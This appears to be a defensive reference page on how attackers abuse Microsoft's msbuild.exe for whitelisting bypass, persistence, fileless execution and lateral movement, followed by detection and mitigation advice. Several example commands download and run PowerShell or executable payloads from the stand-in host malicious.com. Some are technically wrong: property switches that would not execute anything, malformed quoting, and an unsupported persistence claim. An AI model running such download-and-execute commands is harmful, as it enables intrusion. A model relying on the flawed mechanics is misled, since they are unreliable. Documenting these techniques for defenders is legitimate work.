# msbuild.exe
## What is it?
*```msbuild.exe``` is a legitimate Microsoft tool used for building applications and managing projects. It is part of the .NET Framework and is responsible for compiling code, packaging applications, and managing project files.*

## Legitimate Usage
- **Building Applications** → ```msbuild.exe``` compiles source code and generates executable files or libraries from project files.
- **Managing Project Files** → It allows developers to manage and automate the build process using MSBuild project files (e.g., .csproj or .vbproj).
- **Automated Builds** → Used in continuous integration (CI) pipelines to automate the process of building, testing, and deploying applications.

## How to abuse it
- **Executing Malicious Code** → Attackers can use ```msbuild.exe``` to run arbitrary code embedded in project files, enabling them to execute payloads without triggering security alerts.
- **Persistence via Custom Projects** → Malicious actors can create custom project files that execute malicious code every time ```msbuild.exe``` is invoked.
- **Bypassing Security Controls** → Since ```msbuild.exe``` is a trusted utility, security tools may overlook its misuse, enabling attackers to bypass defenses like application whitelisting.
- **Fileless Malware** → Attackers can execute payloads directly in memory using ```msbuild.exe```, avoiding the creation of files on disk and evading traditional detection methods.

## Example attacks
### 1. Malicious Code Execution via Project Files
*Attackers can embed malicious PowerShell commands or other executable code into a project file and execute them using ```msbuild.exe```.*

**Execute Malicious Code Embedded in a Project File**

```
msbuild.exe C:\path\to\malicious_project.proj
```

**Effect:**
- The ```malicious_project.proj``` file contains embedded code that gets executed, which could include PowerShell scripts, reverse shells, or other malicious payloads.

### 2. Bypassing Application Whitelisting
*Since ```msbuild.exe``` is a trusted tool, it can be used to bypass application whitelisting policies and execute malicious code within a trusted process.*

**Execute Malicious PowerShell Script via MSBuild**

```
msbuild.exe /target:build /p:RunCustomScript="powershell -nop -exec bypass -command "Invoke-WebRequest -Uri http://malicious.com/malware.ps1 -OutFile C:\Windows\Temp\malware.ps1; . C:\Windows\Temp\malware.ps1""
```

**Effect:**
- This command uses ```msbuild.exe``` to run a malicious PowerShell script, bypassing application control measures like AppLocker.

### 3. Persistence via Custom MSBuild Projects
*Attackers can create malicious MSBuild project files that maintain persistence, ensuring the execution of payloads each time ```msbuild.exe``` is run.*

**Create Persistent Payload with MSBuild**

```
msbuild.exe /t:Build /p:PreBuildEvent="powershell -nop -exec bypass -command "Invoke-WebRequest -Uri http://malicious.com/payload.exe -OutFile C:\Windows\Temp\payload.exe; Start-Process C:\Windows\Temp\payload.exe""
```

**Effect:**
- The malicious payload will be executed each time the build process is triggered, ensuring persistence on the system.

### 4. Fileless Malware Execution
*```msbuild.exe``` can be used to execute fileless malware, which runs directly from memory and never writes to disk, reducing the chances of detection by traditional security tools.*

**Run Fileless Malware with MSBuild**

```
msbuild.exe /p:RunCustomScript="powershell -nop -exec bypass -command "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')\""
```

**Effect:**
- The PowerShell script is downloaded and executed directly from memory, avoiding file creation on disk and evading file-based security tools.

### 5. Lateral Movement via MSBuild
*Attackers can use ```msbuild.exe``` to remotely execute malicious code on other machines in the network, propagating malware or stealing data.*

**Run Malicious MSBuild Project Remotely**

```
Invoke-Command -ComputerName TargetMachine -ScriptBlock { msbuild.exe C:\path\to\malicious_project.proj }
```

**Effect:**
- This command remotely executes ```msbuild.exe``` on the target machine, executing the embedded malicious code within the project file.

# Detection & Mitigation
## Detection Methods
**Monitor for Unusual MSBuild Execution**
- **Event ID 4688 (Process Creation)** → Detect the execution of ```msbuild.exe``` with unusual arguments or from unexpected locations.
- **Fileless Malware Detection** → Use endpoint protection tools to detect and flag memory-based execution patterns.

**Monitor Suspicious Project Files**
- **Audit MSBuild Project Files** → Look for project files containing suspicious commands or scripts that invoke external URLs or execute system-level commands.

**Detect PowerShell Execution**
- **Event ID 4104 (PowerShell Script Block Logging)** → Detect PowerShell scripts executed via ```msbuild.exe``` for command-and-control or payload delivery.

## Mitigation Strategies
- **Restrict Use of MSBuild** → Use application whitelisting (e.g., AppLocker) to restrict the execution of ```msbuild.exe``` to authorized users and applications only.
- **Disable Unnecessary MSBuild Functionality** → Prevent MSBuild from running untrusted project files by restricting access to the MSBuild tool or controlling which scripts and commands it can run.
- **Monitor for Fileless Malware** → Implement behavioral-based detection methods to identify and block fileless malware executions.
- **Use Endpoint Protection Tools** → Ensure antivirus and endpoint detection and response (EDR) tools are configured to flag suspicious MSBuild activity and fileless payloads.
